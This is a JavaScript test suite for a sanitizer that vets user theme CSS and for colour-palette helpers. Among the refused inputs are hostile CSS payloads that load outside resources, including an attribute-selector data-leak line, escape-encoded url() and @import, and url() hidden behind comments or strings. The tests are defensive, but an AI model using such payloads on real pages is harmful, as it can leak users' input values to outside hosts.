import { test } from "node:test";
import assert from "node:assert/strict";
import { THEME_CSS_MAX, hexIsLight, mixHex, themeCssProblem, themeFromColors } from "../assets/theme-css.mjs";
import { THEME_UI_VARS, THEME_TERM_KEYS } from "../assets/themes.mjs";

const refused = (css) => assert.ok(themeCssProblem(css), `should refuse: ${css}`);
const kept = (css) => assert.equal(themeCssProblem(css), "", `should keep: ${css}`);

test("css that only restyles is kept", () => {
  kept("");
  kept(undefined);
  kept(".sv-user { border-radius: 2px !important; } #rail { background: linear-gradient(red, blue); }");
  kept("html[data-appearance=\"light\"] .tile { border-color: #c0ffee; }");
  kept("@media (min-width: 0px) { .sv-msg { letter-spacing: .01em; } }");
  kept("@keyframes glow { to { opacity: .5; } } .tile { animation: glow 2s infinite; }");
  kept("@font-face { font-family: Mine; src: local(\"Hack\"); }");
  kept("u/**/rl(https://example.com/x) { color: red; }");
});

test("an address that stays inside the page is kept", () => {
  kept(".a { background: url(data:image/png;base64,iVBORw0KGgo=); }");
  kept(".a { background: url( 'data:image/svg+xml,<svg/>' ); }");
  kept(".a { mask: url(#cut); }");
  kept(".a { background: URL(\"data:image/gif;base64,R0lGOD\"); }");
});

test("every way to load a file is refused", () => {
  refused("@import url(https://example.com/x.css);");
  refused("@IMPORT 'x.css';");
  refused(".a { background: url(https://example.com/x.png); }");
  refused(".a { background: URL( https://example.com/x.png ); }");
  refused(".a { background: url(\"//example.com/x.png\"); }");
  refused(".a { background: url(/assets/icon.png); }");
  refused(".a { cursor: url(https://example.com/c), auto; }");
  refused(".a { background: var(--none, url(https://example.com/h)); }");
  refused(".a { list-style: env(none, url(https://example.com/l)); }");
  refused(".a { background: image-set(\"x.png\" 1x); }");
  refused(".a { background: -webkit-image-set(\"x.png\" 1x); }");
  refused(".a { background: src(\"https://example.com/s\"); }");
  refused("@property --leak { syntax: '<url>'; inherits: true; initial-value: url(https://example.com/p); }");
  refused("@namespace url(https://example.com/ns);");
  refused(".a { background: url(data:image/png;base64,AA), url(https://example.com/second); }");
  refused("input[value^=\"a\"] { background: url(https://example.com/leak?a); }");
});

test("an escape that could spell url or import is refused, whatever it spells", () => {
  refused(".a { background: u\\72l(https://example.com/e); }");
  refused(".a { mask-image: v\\61r(--none, u\\72l(https://example.com/e)); }");
  refused("@\\69mport 'x.css';");
  refused(".a { content: \"\\201C\"; }");
});

test("a comment or a string cannot hide a real url() from the check", () => {
  refused(".a { content: \"/*\"; background: url(https://example.com/x); content: \"*/\"; }");
  refused("/* url(https://example.com/x) */ .a { color: red; }");
});

test("css past the size limit is refused", () => {
  refused(`.a { color: red; }${" ".repeat(THEME_CSS_MAX)}`);
  kept(`.a{color:red}${" ".repeat(THEME_CSS_MAX - 13)}`);
  assert.ok(themeCssProblem(42));
});

test("two colours make a whole palette in the tone of the canvas", () => {
  const dark = themeFromColors({ canvas: "#1A1B26", accent: "#7AA2F7" });
  assert.deepEqual(Object.keys(dark.ui).sort(), Object.keys(THEME_UI_VARS).sort());
  assert.deepEqual(Object.keys(dark.terminal).sort(), [...THEME_TERM_KEYS].sort());
  assert.equal(dark.ui.bg, "#1A1B26");
  assert.equal(dark.ui.accent, "#7AA2F7");
  assert.equal(hexIsLight(dark.ui.txt), true);
  assert.equal(hexIsLight(dark.ui.bg), false);
  const light = themeFromColors({ canvas: "#FAF7F0", accent: "#B4572E" });
  assert.equal(hexIsLight(light.ui.bg), true);
  assert.equal(hexIsLight(light.ui.txt), false);
  for (const one of Object.values({ ...dark.ui, ...dark.terminal, ...light.ui, ...light.terminal })) assert.match(one, /^#[0-9A-F]{6}$/);
});

test("single roles override the derived palette, and nonsense is ignored", () => {
  const made = themeFromColors({ canvas: "#000", accent: "#fff", colors: { green: "#00ff00", red: "#ff0000", evil: "#123456", txt: "url(x)" } });
  assert.equal(made.ui.green, "#00FF00");
  assert.equal(made.terminal.red, "#FF0000");
  assert.equal(made.ui.evil, undefined);
  assert.notEqual(made.ui.txt, "url(x)");
  assert.equal(themeFromColors({ canvas: "red", accent: "#fff" }), null);
  assert.equal(themeFromColors({ canvas: "#000" }), null);
});

test("mixing walks a straight line between two colours", () => {
  assert.equal(mixHex("#000000", "#FFFFFF", 0), "#000000");
  assert.equal(mixHex("#000000", "#FFFFFF", 1), "#FFFFFF");
  assert.equal(mixHex("#000", "#fff", 0.5), "#808080");
});
